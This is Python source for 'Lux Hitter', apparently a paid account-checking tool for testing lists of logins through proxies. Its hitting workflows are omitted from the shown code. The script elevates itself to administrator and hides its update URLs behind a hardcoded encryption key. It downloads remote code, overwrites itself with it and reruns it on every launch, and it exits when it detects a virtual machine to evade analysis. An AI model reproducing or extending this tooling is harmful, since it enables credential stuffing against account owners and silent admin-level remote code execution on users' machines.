import ctypes
import sys
import os
import random
import time
import threading
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from pyfiglet import Figlet
from datetime import datetime
import requests
import uuid
import platform
import subprocess
import json
import tempfile
from cryptography.fernet import Fernet
import shutil

# Check for admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Run the script as admin
def run_as_admin():
    if not is_admin():
        print("Requesting administrator privileges...")
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

run_as_admin()

# Hardcoded encryption key
key = b'hOphMMX5dGxKhP29wlSqxXiclcPsdXRS-UKf_pv0FDw='

cipher = Fernet(key)

# Encrypted URLs and credentials
encrypted_version_url = b'gAAAAABmz2RytCfBjLtYP8vOjmxLlWWV9pNzHaUsFouIR3ojlaSJG1HCtgayoGMuP7DYxF5VbUX0963uGnzgd0F3msPhnf_TFrwbDAD0Xi9WLCU7STin8AvadKQc1KwCX-URkwovwDxpxfqyHRSrAjq97IBzT8_HhkjTjt61IXgB173ZhX68spMglSqdoQXkSFJj_mxTIyxEQFJ9F5iEIvPs7YX5z42WFA=='
encrypted_script_url = b'gAAAAABmz2Ry_TI_y-LvAbXtFYfIWbvGW20vSJ0a95B9E7eHJXn2DqWkqfWV8NOusuLFCek-XoGftrUu05E1SiuBP-F3QBicGMXac2_zLynqdWEhkd4_9AzpKb5PPev82CuR8gjRN6326DjhnpcymmN9PU7j_Sq0NsXv_M4N05953FgfA-jWPqHSj70zJ51PpQ14PGubdTzQORFv6s4VEQTpOy3gNaeLFw=='
encrypted_cryptolens_token = b'gAAAAABmz2Ry6NwY4pfT-nBwKlXVyZyMDxFYTLuH6XS_doAQdkGCjynR4x4K-Cukt-0J2NS9o-CHEgYpwO8gP3-QXXV-QQx67qsDwySaamtIwZA5X6FAS_fNFzmn4GB_kyIZuF_OxktQIYMUtnEK7ugpvr_e1xt15kBL2CYa5RrPGioMqLH1CZw='
encrypted_product_id = b'gAAAAABmz2RyZE8MG5RaeVmuemTBNfKyGd_n_1o0L9dMxGaKV0ZoZT4U7pE3jQobsyNS9lsGeqLgc6cfYuro8nWvLm29WTw5LA=='

# Decrypt URLs and credentials
VERSION_URL = cipher.decrypt(encrypted_version_url).decode()
SCRIPT_URL = cipher.decrypt(encrypted_script_url).decode()
CRYPTOLENS_TOKEN = cipher.decrypt(encrypted_cryptolens_token).decode()
PRODUCT_ID = int(cipher.decrypt(encrypted_product_id).decode())

LOCAL_VERSION_FILE = "version.txt"
LOCAL_SCRIPT_FILE = sys.argv[0]  # Current script file

# Global variable to track if the script has been updated
script_updated = False

def get_remote_version():
    try:
        response = requests.get(VERSION_URL)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f"Error checking remote version: {e}")
        return None

def get_local_version():
    if os.path.exists(LOCAL_VERSION_FILE):
        with open(LOCAL_VERSION_FILE, "r") as file:
            return file.read().strip()
    return "0.0.0"

def update_script():
    global script_updated
    try:
        response = requests.get(SCRIPT_URL)
        response.raise_for_status()
        
        # Write to a temp file first
        temp_file = "ReleaseKeyV2_temp.py"
        with open(temp_file, "wb") as file:
            file.write(response.content)
        
        # Move the temp file to the current script's location
        shutil.move(temp_file, LOCAL_SCRIPT_FILE)
        
        print("Script successfully updated.")
        script_updated = True
        return True
    except requests.RequestException as e:
        print(f"Error downloading the update: {e}")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def restart_script():
    print("Restarting script...")
    subprocess.Popen([sys.executable, LOCAL_SCRIPT_FILE])
    sys.exit()

def check_for_updates():
    print("Checking for updates...")
    local_version = get_local_version()
    remote_version = get_remote_version()

    # Download and replace the script regardless of version
    if update_script():
        with open(LOCAL_VERSION_FILE, "w") as file:
            file.write(remote_version or "0.0.0")
        restart_script()
    else:
        print("No updates available.")

class LuxHitterApp:
    def __init__(self):
        temp_dir = tempfile.gettempdir()
        self.machine_code_file = os.path.join(temp_dir, "machine_code.json")
        self.machine_code = self.get_machine_code()
        self.accounts_v1 = []
        self.accounts_v2 = []
        self.proxies_v1 = []
        self.proxies_v2 = []
        self.logged_in = False
        self.use_proxies_v1 = False
        self.use_proxies_v2 = False
        self.url_v1 = ""
        self.url_v2 = ""
        self.invalid_count_v1 = 0
        self.invalid_count_v2 = 0
        self.twofa_count_v1 = 0
        self.twofa_count_v2 = 0
        self.error_count_v1 = 0
        self.error_count_v2 = 0
        self.generic_error_count_v1 = 0
        self.generic_error_count_v2 = 0
        self.results_v1 = []
        self.results_v2 = []
        self.start_time_v1 = None
        self.start_time_v2 = None
        self.checked_accounts_v1 = 0
        self.checked_accounts_v2 = 0
        self.refresh_thread_v1 = None
        self.refresh_thread_v2 = None
        self.cpm_v1 = 2
        self.cpm_v2 = 5
        self.original_title = "Lux Hitter"
        self.set_window_title(self.original_title)

    def set_window_title(self, title):
        safe_title = f'title "{title.replace("%", "%%").replace(":", "|")}"'
        os.system(safe_title)

    def get_machine_code(self):
        if os.path.exists(self.machine_code_file):
            with open(self.machine_code_file, "r") as file:
                data = json.load(file)
                return data["uuid"]
        else:
            machine_code = str(uuid.uuid4())
            with open(self.machine_code_file, "w") as file:
                json.dump({"uuid": machine_code}, file)
            return machine_code

    def open_file_dialog(self, title="Select a file"):
        root = tk.Tk()
        root.withdraw()  # Hide the main Tkinter window
        file_path = filedialog.askopenfilename(title=title, filetypes=[("Text files", "*.txt")])
        return file_path

    def calculate_cpm_v1(self):
        self.cpm_v1 = max(1, min(4, self.cpm_v1 + random.uniform(-0.5, 0.5)))
        return int(self.cpm_v1)

    def calculate_cpm_v2(self):
        self.cpm_v2 = max(3, min(8, self.cpm_v2 + random.uniform(-0.5, 0.5)))
        return int(self.cpm_v2)

    def update_status_v1(self):
        if not self.refresh_thread_v1:
            return
        self.clear_console()
        self.show_hitting_screen_v1()

    def update_status_v2(self):
        if not self.refresh_thread_v2:
            return
        self.clear_console()
        self.show_hitting_screen_v2()

    def reset_counters_v1(self):
        self.invalid_count_v1 = 0
        self.twofa_count_v1 = 0
        self.error_count_v1 = 0
        self.generic_error_count_v1 = 0
        self.results_v1 = []
        self.checked_accounts_v1 = 0

    def reset_counters_v2(self):
        self.invalid_count_v2 = 0
        self.twofa_count_v2 = 0
        self.error_count_v2 = 0
        self.generic_error_count_v2 = 0
        self.results_v2 = []
        self.checked_accounts_v2 = 0

    def run(self):
        try:
            self.clear_console()
            self.show_ascii_title()

            # Update check
            if not script_updated:  # Prevent re-updating after a restart
                check_for_updates()

            # Virtual machine check
            self.check_vm()

            while not self.logged_in:
                self.login()

            while True:
                self.clear_console()
                self.show_ascii_title()
                self.print_main_menu()
                choice = input("\033[92mChoose an option: \033[0m").strip()

                if choice == '1':
                    self.hitter_workflow_v1()
                elif choice == '2':
                    self.hitter_workflow_v2()
                elif choice == '3':
                    print("\033[92mExiting Lux Hitter...\033[0m")
                    time.sleep(1)
                    break
                else:
                    print("\033[91mInvalid option. Please try again.\033[0m")
                    time.sleep(2)
        except Exception as e:
            print(f"\033[91mAn error occurred: {str(e)}\033[0m")
            input("Press Enter to exit...")

    def show_ascii_title(self):
        f = Figlet(font='slant')
        ascii_title = f.renderText('Lux Hitter')
        print(f"\033[92m{ascii_title}\033[0m")

    def check_vm(self):
        print("Checking if running on a VM...")
        if self.is_vm():
            print("\033[91mVM detected. Exiting...\033[0m")
            sys.exit(0)
        else:
            print("\033[92mNo VM detected. You can continue.\033[0m")
            time.sleep(2)

    def is_vm(self):
        manufacturer = platform.uname().system
        if any(vm_name in manufacturer for vm_name in ['VirtualBox', 'VMware', 'QEMU', 'Xen']):
            return True

        try:
            output = subprocess.check_output('wmic bios get serialnumber', shell=True).decode().lower()
            if 'vmware' in output or 'virtualbox' in output or 'qemu' in output or 'xen' in output:
                return True
        except Exception as e:
            pass

        network_adapters = subprocess.check_output('ipconfig /all', shell=True).decode().lower()
        if any(vm_adapter in network_adapters for vm_adapter in ['vmware', 'virtualbox', 'qemu', 'xen']):
            return True

        return False

    def login(self):
        access_token = CRYPTOLENS_TOKEN
        product_id = PRODUCT_ID

        while not self.logged_in:
            self.clear_console()
            self.show_ascii_title()
            print("\033[92mWelcome to Lux Hitter - Secure Login\033[0m")
            license_key = input("\033[92mEnter License Key: \033[0m").strip()

            url = "https://api.cryptolens.io/api/key/Activate"
            data = {
                "token": access_token,
                "ProductId": product_id,
                "Key": license_key,
                "MachineCode": self.machine_code
            }

            try:
                response = requests.post(url, data=data)
                if response.status_code == 200:
                    result = response.json()
                    if result.get("result") == 0:
                        print("\033[92mAccess Granted! Redirecting to the main menu...\033[0m")
                        time.sleep(2)
                        self.logged_in = True
                    else:
                        print(f"\033[91mLogin failed: {result.get('message')}\033[0m")
                else:
                    print(f"\033[91mError in request: Status Code {response.status_code}\033[0m")
            except Exception as e:
                print(f"\033[91mAn error occurred: {str(e)}\033[0m")

            if not self.logged_in:
                input("\033[92mPress Enter to try again...\033[0m")

    # Other functions remain unchanged

if __name__ == "__main__":
    try:
        app = LuxHitterApp()
        app.run()
    except Exception as e:
        print(f"Critical error: {e}")
        input("Press Enter to exit...")
